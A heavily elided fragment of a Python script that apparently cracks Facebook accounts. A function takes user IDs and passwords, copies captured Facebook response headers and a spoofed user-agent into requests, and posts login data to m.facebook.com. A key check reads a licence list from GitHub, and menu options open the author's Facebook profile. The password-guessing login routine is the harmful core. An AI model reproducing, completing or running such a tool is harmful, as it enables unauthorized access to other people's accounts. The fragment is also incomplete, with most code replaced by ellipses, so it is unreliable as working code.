...
def menu_apikey():
 ...
 #os.system(f'xdg-open https://www.facebook.com/ashikur.rahman.96126')
  ...
  try:
    httpCaht = requests.get("https://github.com/Ashikur96126/pass/blob/main/key.txt").text
    if id in httpCaht:
...
def admin():
	...
	if bal =='1':
		...
		admin()
	if bal =='2':
		os.system('xdg-open https://www.facebook.com/ashikur.rahman.96126');time.sleep(1)
		admin()
	if bal =='3':
...
def a(uid,pwx,tl):
    ...
    'method': 'GET',
    'scheme': 'https',
'etag': "d669c05c02dd30340dc0cda5ba7919b41b302b52"
...
'x-fb-request-id': 'AzVhO64gBAbu0moOIST_WR7',
'x-fb-trace-id': 'Gqb5P7nWyLy',
'x-fb-rev': '1007485009',
'x-fb-debug': 'E8BTdc+MYtKatqTxwzdlzigpEkUNVW0FBXr0kz0BZQ+b4IihhaoJYKoOIQLt/knCSxP80EuezVI22XtAbQlUqg==',
'content-length': '273',
'date': 'Fri, 12 May 2023 13:57:10 GMT',
'alt-svc': 'h3=:443,ma=86400', 
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'max-age=0',
    'referer': 'https://developers.facebook.com/login/device-based',
    ...
    'user-agent': pro
            ...
            lo = session.post('https://m.facebook.com/login/?wtsid=rdr_0bTt8NUnRPC5SzUr0&refsrc=deprecated&_rdr',data=log_data,headers=header_freefb).text
